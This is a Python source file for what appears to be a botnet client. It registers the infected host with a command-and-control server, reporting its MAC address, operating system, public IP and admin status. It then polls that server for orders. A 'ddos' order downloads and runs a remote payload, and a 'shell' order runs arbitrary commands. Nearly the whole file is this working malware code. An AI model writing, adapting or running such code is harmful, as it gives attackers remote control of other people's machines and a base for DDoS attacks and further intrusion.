import requests
import time
import subprocess
import ctypes
import os
import re, uuid
import platform
import random

C2_URL = "http://127.0.0.1:8000/control/"
BOT_ID = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
POLLING_INTERVAL = 30

#time.sleep(random.randint(60, 120))

def is_admin():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    return is_admin

def os_info():
    if platform.system() == "Windows":
        return platform.system() + " " + platform.release() + " " + platform.version()
    elif platform.system() == "Linux":
        return platform.freedesktop_os_release()["NAME"] + " " + platform.release()

def register():
    try:
        print("[+] Registering bot ID: " + str(BOT_ID))
        info = {
            "mac": BOT_ID,
            "os": os_info(),
            "arch": platform.architecture()[0],
            "ip_address": requests.get('https://api4.ipify.org').text,
            "privileges": "admin" if is_admin() else "user"
            
        }
        response = requests.post(C2_URL + 'register/', json=info)
        if response.status_code == 200:
            print("[+] Registration successful")
        else:
            print("[-] Registration failed: " + str(response.status_code))
    except Exception as e:
        print("[-] Error registering with C2: " + str(e))


def download_and_execute(payload_url, args):
    try:
        print("[+] Downloading payload from " + payload_url)
        response = requests.get(payload_url)
        
        if response.status_code == 200:
            payload_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.path.basename(payload_url))
            with open(payload_path, "wb") as file:
                file.write(response.content)

            print("[+] Payload downloaded to " + payload_path)

            if payload_path.endswith(".py"):
                command = "python3 " + payload_path + " " + str(args)
            else:
                command = payload_path + " " + str(args)
                
            print("[+] Executing payload: " + str(command))
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            print("[+] Execution result: " + str({result.decode('utf-8')}))

            return result.decode('utf-8')
        else:
            return "Failed to download payload: " + str(response.status_code)
    except Exception as e:
        return str(e)


def poll_for_commands():
    while True:
        try:
            print("[+] Polling for commands from C2... Bot ID: " + str(BOT_ID))
            response = requests.get(C2_URL + "command/", params={"mac": BOT_ID}, timeout=30)
            print(response.text)
            if response.status_code == 200:
                command = response.json().get("command")
                payload_url = response.json().get("payload_url")
                args = response.json().get("args")

                if command:
                    print("[+] Received command: " + command)
                    
                    if command == "ddos":
                        if payload_url:
                            result = download_and_execute(payload_url, args if args else "")
                        else:
                            result = "Invalid payload details"
                    elif command == "shell":
                        result = execute_shell_command(args)
                    else:
                        result = "Unknown command: " + command
                    if result:
                        requests.post(C2_URL + "result/", json={"mac": BOT_ID})
                else:
                    print("[+] No command received")

            else:
                print("[-] Failed to poll: " + str(response.status_code))
                time.sleep(30)
        
        except requests.exceptions.Timeout:
            print("[+] Polling timed out, retrying...")
            time.sleep(POLLING_INTERVAL)
        except Exception as e:
            print("[-] Error polling for commands: " + str(e))
            time.sleep(POLLING_INTERVAL)


def execute_shell_command(command):
    try:
        print("[+] Executing command: " + command)
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return "Command failed"
    except Exception as e:
        return str(e)


if __name__ == "__main__":
    register()
    poll_for_commands()
